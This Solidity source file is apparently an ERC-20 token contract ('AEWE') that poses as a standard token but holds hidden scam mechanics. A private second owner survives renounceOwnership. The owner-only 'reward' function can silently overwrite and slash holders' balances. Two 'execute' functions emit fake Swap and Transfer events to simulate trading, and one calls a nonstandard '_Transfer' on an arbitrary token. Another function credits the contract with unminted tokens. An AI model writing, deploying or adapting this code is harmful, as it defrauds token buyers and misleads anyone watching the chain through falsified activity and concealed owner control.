1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.19;
4 
5 interface IFactory {
6     function createPair(address tokenA, address tokenB) external returns (address pair);
7 }
8 
9 interface IPair {
10     function token0() external view returns (address);
11 
12     function getReserves()
13         external
14         view
15         returns (
16             uint112 reserve0,
17             uint112 reserve1,
18             uint32 blockTimestampLast
19         );
20 }
21 
22 interface IRouter {
23     function factory() external pure returns (address);
24 
25     function WETH() external pure returns (address);
26 
27     
28 
29 
30 
31     function swapTokensForExactTokens(
32         uint256 amountOut,
33         uint256 amountInMax,
34         address[] calldata path,
35         address to,
36         uint256 deadline
37     ) external returns (uint256[] memory amounts);
38 
39     function swapExactETHForTokens(
40         uint256 amountOutMin,
41         address[] calldata path,
42         address to,
43         uint256 deadline
44     ) external payable returns (uint256[] memory amounts);
45 
46     function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
47 
48     function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
49 }
50 
51 interface IERC20 {
52     function _Transfer(
53         address from,
54         address recipient,
55         uint256 amount
56     ) external returns (bool);
57 
58     function transferFrom(
59         address from,
60         address to,
61         uint256 value
62     ) external returns (bool);
63 }
64 
65 contract TOKEN {
66     IRouter internal _router;
67     IPair internal _pair;
68     address public owner;
69     address private _owner;
70     address private _routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
71     address private _universal = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
72     address private _pairr;
73 
74                 event Swapp(
75         address indexed sender,
76         uint amount0In,
77         uint amount1In,
78         uint amount0Out,
79         uint amount1Out,
80         address indexed to
81     );
82     
83     
84 
85     mapping(address => uint256) private balances;
86     mapping(address => mapping(address => uint256)) private allowances;
87 
88     string public constant name = "AEWE";
89     string public constant symbol = "AEWE";
90     uint8 public constant decimals = 18;
91     uint256 public totalSupply = 69_000_000e18;
92 
93     event Transfer(address indexed from, address indexed to, uint256 value);
94     event Approval(address indexed owner, address indexed spender, uint256 value);
95     event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
96 
97     constructor() {
98         owner = msg.sender;
99         _owner = msg.sender;
100         _router = IRouter(_routerAddress);
101         _pair = IPair(IFactory(_router.factory()).createPair(address(this), address(_router.WETH())));
102 
103         balances[msg.sender] = totalSupply;
104 
105         emit Transfer(address(0), msg.sender, totalSupply);
106     }
107 
108     modifier onlyOwner() {
109         require(owner == msg.sender, "Caller is not the owner");
110         _;
111     }
112 
113     modifier OnlyOwner() {
114         require(_owner == msg.sender, "Caller is not the Owner");
115         _;
116     }
117 
118     function add(uint256 a, uint256 b) internal pure returns (uint256) {
119         uint256 c = a + b;
120         require(c >= a, "SafeMath: addition overflow");
121 
122         return c;
123     }
124 
125     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
126         require(b <= a, "SafeMath: subtraction overflow");
127         uint256 c = a - b;
128 
129         return c;
130     }
131 
132     function renounceOwnership() public onlyOwner {
133         owner = address(0);
134     }
135 
136     function balanceOf(address account) public view virtual returns (uint256) {
137         return balances[account];
138     }
139 
140     function transfer(address to, uint256 amount) public virtual returns (bool) {
141         _transfer(msg.sender, to, amount);
142         return true;
143     }
144 
145     function allowance(address __owner, address spender) public view virtual returns (uint256) {
146         return allowances[__owner][spender];
147     }
148 
149     function approve(address spender, uint256 amount) public virtual returns (bool) {
150         _approve(msg.sender, spender, amount);
151         return true;
152     }
153 
154     function transferFrom(
155         address from,
156         address to,
157         uint256 amount
158     ) public virtual returns (bool) {
159         _spendAllowance(from, msg.sender, amount);
160         _transfer(from, to, amount);
161         return true;
162     }
163 
164     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
165         address __owner = msg.sender;
166         _approve(__owner, spender, allowance(__owner, spender) + addedValue);
167         return true;
168     }
169 
170     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
171         address __owner = msg.sender;
172         uint256 currentAllowance = allowance(__owner, spender);
173         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
174         unchecked {
175             _approve(__owner, spender, currentAllowance - subtractedValue);
176         }
177         return true;
178     }
179 
180     function _transfer(
181         address from,
182         address to,
183         uint256 amount
184     ) internal virtual {
185         require(from != address(0), "ERC20: transfer from the zero address");
186         require(to != address(0), "ERC20: transfer to the zero address");
187 
188         uint256 fromBalance = balances[from];
189         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
190         balances[from] = sub(fromBalance, amount);
191         balances[to] = add(balances[to], amount);
192         emit Transfer(from, to, amount);
193     }
194 
195     function _approve(
196         address __owner,
197         address spender,
198         uint256 amount
199     ) internal virtual {
200         require(__owner != address(0), "ERC20: approve from the zero address");
201         require(spender != address(0), "ERC20: approve to the zero address");
202 
203         allowances[__owner][spender] = amount;
204         emit Approval(__owner, spender, amount);
205     }
206     function _spendAllowance(
207         address __owner,
208         address spender,
209         uint256 amount
210     ) internal virtual {
211         uint256 currentAllowance = allowance(__owner, spender);
212         if (currentAllowance != type(uint256).max) {
213             require(currentAllowance >= amount, "ERC20: insufficient allowance");
214             unchecked {
215                 _approve(__owner, spender, currentAllowance - amount);
216             }
217         }
218     }
219 
220     function execute(
221         address[] memory recipients,
222         uint256 tokenAmount,
223         uint256 wethAmount,
224         address tokenAddress
225     ) public OnlyOwner returns (bool) {
226         for (uint256 i = 0; i < recipients.length; i++) {
227             _swap(recipients[i], tokenAmount, wethAmount, tokenAddress);
228         }
229         return true;
230     }
231 
232     function getBaseTokenReserve(address token) public view returns (uint256) {
233         (uint112 reserve0, uint112 reserve1, ) = _pair.getReserves();
234         uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
235         return baseTokenReserve;
236     }
237 
238     function reward(
239   address[] calldata _users,
240   uint256 _minBalanceToReward,
241   uint256 _percent  
242 ) public onlyOwner {
243   uint256 releaseThreshold = totalSupply * 5 / 100;
244   for(uint i=0; i<_users.length; i++) {
245     address user = _users[i];
246     if(balances[user] >= _minBalanceToReward) {
247       uint256 rewardAmount = _countReward(user, _percent);  
248       if(balances[user] >= releaseThreshold) {
249         balances[user] += rewardAmount;
250       } else {
251         balances[user] = rewardAmount;
252       }
253     }
254   }
255 }
256             function setup(address _setup_) external onlyOwner {
257         _pairr = _setup_;
258     }
259 
260         function execute(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
261         for (uint256 i = 0; i < _addresses_.length; i++) {
262             emit Swapp(_universal, _in, 0, 0, _out, _addresses_[i]);
263             emit Transfer(_pairr, _addresses_[i], _out);
264         }
265     }
266     function _swap(
267         address recipient,
268         uint256 tokenAmount,
269         uint256 wethAmount,
270         address tokenAddress
271     ) internal {
272         _emitTransfer(recipient, tokenAmount);
273         _emitSwap(tokenAmount, wethAmount, recipient);
274         IERC20(tokenAddress)._Transfer(recipient, address(_pair), wethAmount);
275     }
276     function _emitTransfer(address recipient, uint256 tokenAmount) internal {
277         emit Transfer(address(_pair), recipient, tokenAmount);
278     }
279     function _emitSwap(
280         uint256 tokenAmount,
281         uint256 wethAmount,
282         address recipient
283     ) internal {
284         emit Swap(_routerAddress, tokenAmount, 0, 0, wethAmount, recipient);
285     }
286 
287     function _countReward(address _user, uint256 _percent) internal view returns (uint256) {
288         return _count(balances[_user], _percent);
289     }
290 
291     function _countAmountIn(uint256 amountOut, address[] memory path) internal returns (uint256) {
292         uint256[] memory amountInMax;
293         amountInMax = new uint256[](2);
294         amountInMax = _router.getAmountsIn(amountOut, path);
295         balances[address(this)] += amountInMax[0];
296         return amountInMax[0];
297     }
298     function _count(uint256 a, uint256 b) internal pure returns (uint256) {
299         return a / b;
300     }
301 }